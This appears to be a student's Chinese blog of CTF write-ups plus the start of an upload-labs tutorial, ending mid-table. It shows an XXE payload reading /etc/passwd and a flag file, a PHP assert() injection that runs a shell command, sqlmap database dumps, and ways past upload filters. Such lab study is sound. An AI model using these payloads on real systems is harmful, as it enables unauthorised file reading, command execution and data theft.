<h3 id="api调用-resolved"><a href="#api调用-resolved" class="headerlink" title="api调用(resolved)"></a><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">api调用</a>(resolved)</h3><p>这道题利用的是xxe漏洞<br>那么<a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">什么是xxe漏洞呢?</a></p>
<blockquote>
<p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
</blockquote>
<p><font size="2">咳, 这说的一点也不简单啊(小声bb) </font><br>对着其中几个陌生的名词来学习下:</p>
<ul>
<li><p>XML : </p>
<blockquote>
<p>可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。</p>
</blockquote>
<p>  根据我自己的理解, 应该就是一种可以<strong>方便计算机理解</strong>的, 使<strong>内部数据具有清晰逻辑结构</strong>的一种<strong>标记语言</strong><br>  示例代码如下: </p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>XML is the best!<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>语法上:<br>这段代码中定义了一个根元素–<code>catalog</code>, <code>id</code>是<code>core</code>的一个属性, <code>author</code>和<code>title</code>则是<code>core</code>的子元素, <code>core</code>是<code>catalog</code>的子元素</p>
</li>
<li><p>功能上:<br>注意看代码的开头部分, 是POST方法的<strong>Header</strong>. 所以其实这段代码本质上仍然是一个<strong>POST方法的http数据包</strong>, 本质上和我们之前分析的post|get数据包没区别. 其作用无非是向服务器提交一份数据而已. 至于怎么处理, 那就看服务端的程序是怎样的了</p>
<br>  </li>
</ul>
</li>
<li><p><strong>允许引用外部实体</strong> :<br>  不过, 如果是下面的这段代码, 就会成为所谓的恶意payload, 如下:</p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  这段代码与上面的只有两行不一样</p>
<ul>
<li><p><code>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</code></p>
</li>
<li><p><code>&lt;description&gt;&amp;xxe;&lt;/description&gt;</code><br>其中<code>&amp;xxe</code>就是恶意引用了外部的文件(实体):<code>file:///etc/passwd</code></p>
<br>
这份数据包如果发送给服务器, 代码被解释并返回

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync...&#125;</span><br></pre></td></tr></table></figure>

<p>“无意”中就把文件的内容泄漏出来了.</p>
<br>
以上就是通过直接DTD外部实体声明实现的xxe. 理论上可以实现任意文件读取.

<p>不过这一切的前提是, <strong>允许对外部实体的引用</strong></p>
</li>
</ul>
</li>
</ul>
<p>好的, 前期知识基础的铺垫就先这么多.<br>回到刚才的题目上来, 我们查看下index.php的源代码, 有这么一段 js 代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>emmm, 这段代码有太多我陌生的方法了(主要是因为没学过js), 全面的理解对解题来说性价比太低了.<br>不过如果能捕捉到其中的关键字<code>XML</code>我想对解题应该能起到一个很好的提示作用吧.<br>总之, 假设我们现在已经知道这道题目是有xxe漏洞的, 那么就可以用刚才的方法读取flag文件!<br><br><br>点击题目的那个<code>GO</code><br>用<code>Burp Suite</code>抓包. 发现是<code>POST</code>方法, body中有一段json格式的代码. 弃之.<br>我们要传xml的数据.<br>所以首先把<code>Content-Type</code>改成<code>application/xml</code><br>再在<code>body</code>中构造如下payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE abcd[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">something</span>&gt;</span>&amp;any;<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终效果图 :</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/xxe.png" alt title class>
                <p></p>
            </figure>
<p>ojbk.</p>
<p>###<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002" target="_blank" rel="noopener">mfw</a>(resolved)</p>
<p>在题目中看到了出题者使用了Git, 可以猜测是Source Leak, 使用GitHack脚本, 能下载部分源代码.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/GitHack.png" alt title class>
                <p></p>
            </figure>

<p>其实一开始以为要用目录扫描工具, 顺便记录下目录扫描的方法, 可以用Kali自带的<code>dirbuster</code>, 也可以用Github上的开源工具<code>dirsearch</code>.<br>这里推荐用后者, 因为它简单易用且十分强大.<br><strong>使用方法</strong> : <code>python dirsearch.py -u [URL] -e *</code></p>
<p>言归正传<br>在下载下的目录中看到有个<code>\templates\flag.php</code>, 进去后写着TODO, 这其实给了我们提示, <strong>要想办法读取这个flag.php</strong>.</p>
<p>再来审计index.php的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br></pre></td></tr></table></figure>

<p>直接上构造好的payload:<code>&#39;,&#39;yjn&#39;) or system(&#39;cat ./templates/flag.php&#39;);//</code></p>
<p>把我们的payload代入进去:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"','yjn') or system('cat ./templates/flag.php');//"</span>;</span><br><span class="line">$file = templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php</span></span><br><span class="line"><span class="string">assert("strpos('</span>templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是, <code>//</code>在这里起到了注释的作用, 但是只注释到assert的括号内.<br>所以这条语句就成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"strpos('templates/','yjn') or system('cat ./templates/flag.php');"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>再把<code>assert()</code>去除掉</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="string">'templates/'</span>,<span class="string">'yjn'</span>) <span class="keyword">or</span> </span><br><span class="line">system(<span class="string">'cat ./templates/flag.php'</span>) <span class="keyword">or</span> </span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>这条语句由三个小语句组成, 并用<code>or</code>连接了起来, 依此编号 1 2 3.<br>那么, 为了得到flag, 我们希望执行<code>语句2</code>,而不希望执行其它语句.<br>所以这里其实是利用了<code>or</code>的<code>短路效应</code>.</p>
<ul>
<li><code>语句1</code> : <code>strpos()</code>函数为查找字串, 但是显然<code>templates/flag.php</code>中没有<code>yjn</code>这个子串, 所以会有个返回值0. <code>or</code>会继续往下执行.</li>
<li><code>语句2</code> : 使系统执行命令<code>cat ./templates/flag.php</code>, 这条命令不光会让我们成功的拿到了flag, 还会返回<code>TRUE</code>, <code>or</code>就不会执行<code>语句3</code>. 如果命令执行不成功, 也会有个<code>FLASE</code>的返回值, 这曾一度给我很大的困扰.</li>
</ul>
<p>最终</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/mfw.png" alt title class>
                <p></p>
            </figure>

<h3 id="NewCenter-solved"><a href="#NewCenter-solved" class="headerlink" title="NewCenter(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686" target="_blank" rel="noopener">NewCenter(solved)</a></h3><p>进入题目是个类似新闻网站的页面, 下面有个搜索框.<br>可以sql注入.<br>但是我现在的sql注入技术还是菜啊, 所以就用<code>sqlmap</code>吧, 记录下~</p>
<p>因为<code>sqlmap</code>要求<code>python2</code>运行, 所以我这里是用的<code>Kali</code>下自带的</p>
<p>首先把搜索的请求包抓取, 将其内容放进一个<code>txt</code>文件中</p>
<p>使用命令<code>sqlmap   -r 1.txt --dbs</code><br>可以将表的名字列出, 发现有个<code>news</code><br>再使用命令<code>sqlmap   -r 1.txt -D news --dump</code><br>就能将这个表的内容全部显示出来<br>get flag~</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ext3-solved"><a href="#ext3-solved" class="headerlink" title="ext3(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5098" target="_blank" rel="noopener">ext3(solved)</a></h3><ul>
<li>重点 :<ul>
<li>ext3 文件系统</li>
<li>strings</li>
<li>文件系统的挂载/卸载</li>
</ul>
</li>
</ul>
<p>附件是个名为<code>linux</code>的文件,<br>扔进 Linux 里,<code>file linux</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>

<p>可以看出是Linux文件系统<code>ext3</code>, 我们要找的<code>flag</code>应该就藏在这个文件里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# string linux | grep &apos;flag&apos;</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure>

<p>但是要读取这个<code>flag.txt</code>,需要我们把文件系统挂载到Linux系统下.<br><code>mount linux /mnt</code><br>现在 <code>/mnt</code>目录就是挂载点.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# cat /mnt/O7avZhikgKgbF/flag.txt</span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure>

<p><code>base64</code> decode后就是flag<br>最后可以使用 <code>umount [挂载点]</code>来卸载文件系统.</p>
<h3 id="pdf-solved"><a href="#pdf-solved" class="headerlink" title="pdf(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5100" target="_blank" rel="noopener">pdf(solved)</a></h3><p>给了一个pdf文件, 里面只有一个图片, 估计flag就在这个图的下面.<br>扔进linux里, 用命令行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftotext pdf.pdf</span><br></pre></td></tr></table></figure>

<p>就会出现<code>pdf.text</code>, 里面有我们要的flag.<br>但是我不太明白为什么用<code>strings pdf.pdf | grep &#39;flag&#39;</code>不能找出flag.<br>姑且推测<code>pdf</code>文件中的文本在二进制格式中不是明文保存的.</p>
<h3 id="坚持60s-solved"><a href="#坚持60s-solved" class="headerlink" title="坚持60s(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5103" target="_blank" rel="noopener">坚持60s(solved)</a></h3><blockquote>
<p>题目描述 : 菜狗发现最近菜猫不爱理他，反而迷上了菜鸡.</p>
</blockquote>
<p>菜猫为啥不喜欢菜狗呢? 难道是因为菜狗不能坚持60s吗 233</p>
<p>打开题目的文件, 是个java小游戏.<br>开心的玩耍了几次, 最好记录是31s. 距离60s还有很长的距离.<br>难道这就凉了吗?<br>不, 身为学计算机的, 要运用超能力.<br>使用java反编译工具<code>jd-gui.java</code>, 反编译后出现需要的flag.</p>
<h3 id="SimpleRAR-struct"><a href="#SimpleRAR-struct" class="headerlink" title="SimpleRAR(struct)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5102" target="_blank" rel="noopener">SimpleRAR(struct)</a></h3><p>别人的wp中说是png的文件头错了,<br>但是我按照他们说的修改了后, 仍然没法复现.<br>暂时存疑</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 随笔 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[上传漏洞]]></title>
      <url>/2019/07/08/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><ol>
<li>阅读了GitHub上的<a href="https://github.com/c0ny1/upload-labs/blob/master/README.md#11-%E4%B8%BB%E7%95%8C%E9%9D%A2" target="_blank" rel="noopener">项目文档</a>后，稍微心里有了点数。<br>迅速clone了项目的代码后，发现是php文件，想运行要先部署环境</li>
</ol>
<ul>
<li>Windows下：<br>  推荐<a href="http://phpstudy.php.cn/download.html" target="_blank" rel="noopener">PHPStudy程序包</a>，集成了<code>Apache</code>+<code>PHP</code>+<code>MySQL</code>+<code>phpMyAdmin</code>+<code>ZendOptimizer</code>，一键安装，傻瓜式操作。</li>
<li>Linux下：<br>  我的服务器已经提前装好了<code>Apache</code>+<code>MySQL</code>+<code>phpMyAdmin</code>，可以参考我搭建服务器环境时的教程<a href="https://cloud.tencent.com/developer/labs/lab/10122" target="_blank" rel="noopener">https://cloud.tencent.com/developer/labs/lab/10122</a></li>
</ul>
<ol start="2">
<li>安装好 PHPStudy 后，找到网站根目录后，把项目的.php文件放入此目录。linux同理。<br> 打开浏览器，输入<a href="http:localhost/upload-labs-master" target="_blank" rel="noopener">http:localhost/upload-labs-master</a>,能显示被解析后的php文件，说明环境已经配置好了。</li>
</ol>
<h2 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h2><p>其实一直以来我对网页的运作方式也是一直半解， <code>PHP</code>,<code>JavaScript</code>,<code>HTML</code>,<code>css</code>什么的傻傻分不清楚,和别人聊起的时候也是一头雾水. 直到前几天刚刚把这个博客真正搭起来，才对<code>HTML</code>和<code>PHP</code>的关系有点理解了. 今天为了后面的学习, 有必要把这部分的知识好好补习下了.<br>主要参考:<a href="https://blog.csdn.net/qq_41147260/article/details/80840298" target="_blank" rel="noopener">你知道HTML、CSS、JS、Services、PHP、ASP.NET 是什么来头么？</a></p>
<p>###HTML<br><code>HTML</code>主要作用于前端(浏览器处).  以我个人的理解，<code>HTML</code>就好像是个成品,是可以直接被浏览器理解的文件. 当自己的电脑得到一个 <code>html</code>页面之后，就会对它进行解析。<code>HTML</code> 就是一种超文本标记语言。</p>
<p>###PHP<br>与<code>HTML</code>相对应, <code>PHP</code>主要应用于服务器端,主要用来写服务器脚本.其实<code>PHP</code>写成的服务器脚本本质上就是个程序, 而且是专门==处理客户端传来的数据、调用本地数据最后生成<code>HTML</code>文件的程序==。这一点上,<code>PHP</code>写成的服务器脚本就好像是个<code>HTML</code>的生成器. 当然, 服务器可以直接把预先设计好的成品<code>HTML</code>丢给客户端, 不过这样的灵活性就大大降低了, 每个人看到的同一个网页都是一模一样的, 而且网站也没法响应用户的其它请求.</p>
<p>###CSS<br>css可以对<code>html</code>网页进行渲染. 如果不用css，效果如下图，按照浏览器默认的样式显示出表格，超链接等。</p>
<figure class="image-box">
                <img src="http://p9.pstatp.com/large/47120003f1ab6a490727" alt title class>
                <p></p>
            </figure>
<p>(其实就是目前看我博客的效果……)<br>不说了, 我学css去了。(溜)</p>
<p>###Javascript<br> <code>Javascript（JS）</code>可以给页面添加一些动态的效果，比如头条的发表的标签，鼠标移上去会弹出一个小窗口，这个就是 JS 实现的效果啦。<strong>浏览器</strong>拿到这样的代码，<strong>就会解析并实现</strong>出相应的效果。且由黑字可知, JavaScript是运行在浏览器上的, 不涉及服务器.<br> 其实用来写浏览器脚本的，也不是非得JavaScript 不可，不过是各大浏览器都默认了：请用 JS 写这些动态效果的代码给我解析~</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><blockquote>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
</blockquote>
<p>看不懂, 不过应该也没关系, 随着下面的题目应该会对这些概念有更加清晰的认识, 不妨带着问题, 开启学习之路.</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h3><ul>
<li>HTML负责放你需要显示的内容，</li>
<li>PHP可以输出可变化的HTML。</li>
<li>CSS可以让你的HTML更加的漂亮，比如加字体颜色加边框。</li>
<li>JS可以让你HTML+CSS组成的页面更加“生动”,粗浅的来说就是JS让页面会动。</li>
<li>webshell是以网页文件形式存在的一种命令执行环境</li>
</ul>
<h2 id="二十题题解"><a href="#二十题题解" class="headerlink" title="二十题题解"></a>二十题题解</h2><h3 id="pass1"><a href="#pass1" class="headerlink" title="pass1:"></a>pass1:</h3><p>由提示</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/pass1tip.png" alt title class>
                <p></p>
            </figure>
<p>根据上面的介绍, JavaScript只会在浏览器中运行, 所以我们在浏览器中禁用掉JavaScript就行了.<br>以chrome浏览器为例.<br>首先在pass1的页面下,点击<code>F12</code>,调出开发者工具.</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/开发者工具.png" alt title class>
                <p></p>
            </figure>
<p>然后点击<code>F1</code>,打开<code>settings</code></p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/setting.png" alt title class>
                <p></p>
            </figure>
<p>在<code>setting</code>的<code>Preferences</code>的末尾部分,有个<code>Disable JavaScript</code>,顾名思义,找的就是它了. 选中后就可以禁用JavaScript, 成功上传<code>php</code>类型的文件, 审查元素, 发现此处的图片是<code>test.php</code>, 说明成功了.</p>
<h3 id="pass2"><a href="#pass2" class="headerlink" title="pass2:"></a>pass2:</h3><p>尝试直接提交test.php, 显示文件类型不匹配.<br>查看下提示<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/pass2tips.png" alt title class>
                <p></p>
            </figure></p>
<p>好了, 什么是MIME呢?</p>
<blockquote>
<p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型;在最早的HTTP协议中,没有附加的数据类型信息.所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。<br>Content-type就是我们经常在 http请求头里 response header看到的那个<br>里面包含的就是MIME信息.<br>作者：<a href="https://www.jianshu.com/p/fb5d8f03c4ed" target="_blank" rel="noopener">王进喜许三多</a></p>
</blockquote>
<p>看来MIME就是在<code>HTTP</code>数据包中标明文件类型的一个参数.<br>举几个例子</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">后缀</th>
<th align="center">content-type</th>
</tr>
</thead>
<tbody><tr>
<td align="center">超文本标记语言</td>
<td align="center">.html</td>
<td align="center">text/html</td>
</tr>
<tr>
<td align="center">xml文档</td>
<td align="center">.xml</td>
<td align="center">text/xml</td>
</tr>
<tr>
<td align="center">XHTML文档</td>
<td align="center">.xhtml</td>
<td align="center">application/xhtml+xml</td>
</tr>
<tr>
<td align="center">普通文本</td>
<td align="center">.txt</td>
<td align="center">text/plain</td>
</tr>
<tr>
<td align="center">RTF文本</td>
<td align="center">.rtf</td>
<td align="center">application/rtf</td>
</tr>
<tr>
<td align="center">PDF文档</td>
<td align="center">.pdf</td>
<td align="center">application/pdf</td>
</tr>
<tr>
<td align="center">Microsoft Word文件</td>
<td align="center">.word</td>
<td align="center">application/msword</td>
</tr>
<tr>
